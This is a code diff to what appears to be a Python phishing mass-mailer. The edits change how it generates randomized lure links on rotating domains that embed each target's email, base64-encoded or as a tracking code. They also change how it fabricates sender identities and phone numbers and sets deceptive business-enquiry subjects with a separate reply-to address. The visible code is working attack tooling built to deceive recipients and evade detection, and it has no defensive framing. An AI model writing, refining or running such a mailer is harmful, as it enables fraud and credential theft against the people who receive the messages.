@@ -2622,7 +2622,8 @@ def getlinks(email):
         #link = f"http://{comrgen()}-{randomchar(random.randint(5,15))}.{linker}/?0=0&conf_id={base64enc(email)}"        
         #link = f"http://{comrgen()}-{randomchar(random.randint(5,15))}.{linker}/?x=y&codex={base64enc(email)}"                
         #link = f"https://{linker}/?0=0&conf_id={base64enc(email)}"                
-        link = f"https://{random.choice(xlinks)}/?action={codex}"        
+        #link = f"https://{random.choice(xlinks)}/?action={codex}"        
+        link = f"https://{random.choice(xlinks)}/index.html?mxid=={codex}"        
         #link = f"https://{random.choice(xlinks)}/#{codex}"        
         #link = f"http://{randomchar(random.randint(4, 16))}.{random.choice(xlinks)}/?0=0&conf_id={base64enc(email)}"
     except Exception as ex:
@@ -2961,7 +2962,7 @@ def mailer(x, y, z):
     lastname = f"{name.split(' ')[1]}"
     fullname = f"{firstname} {lastname}"
     cell = f"+{randint(random.randrange(2, 3))} ({randint(3)}) - {randint(7)}"
-    fullemail = f"{lastname}_{firstname}.{randomchar(random.randrange(3, 7))}@{domain}"
+    fullemail = f"{lastname}_{firstname}.{randomchar(random.randrange(4, 6))}@{domain}"
     #fullemail = f"{lastname}{firstname}{randomchar(random.randrange(2, 8))}@{domain}"
     ccname = str(namegen())
     ccemail = f'{ccname.split(" ")[1]}.{ccname.split(" ")[0]}{domain}'
@@ -2981,10 +2982,10 @@ def mailer(x, y, z):
 
     msg = MIMEMultipart('alternative')
     #msg['Subject'] = f"{userdomainfront.upper()} catalog and price list"
-    msg['Subject'] = f"{corp} enquiry for {userdomainfront.upper()} company"
+    #msg['Subject'] = f"{corp} enquiry for {userdomainfront.upper()} company"
     #msg['Subject'] = f"{userdomainfront.upper()} export"
     #msg['Subject'] = f"enquiry for {userdomainfront.upper()}"
-    #msg['Subject'] = f"{subj}"
+    msg['Subject'] = f"{subj}"
     msg['From'] = me
     msg['To'] = email
     msg.add_header('reply-to', mex)
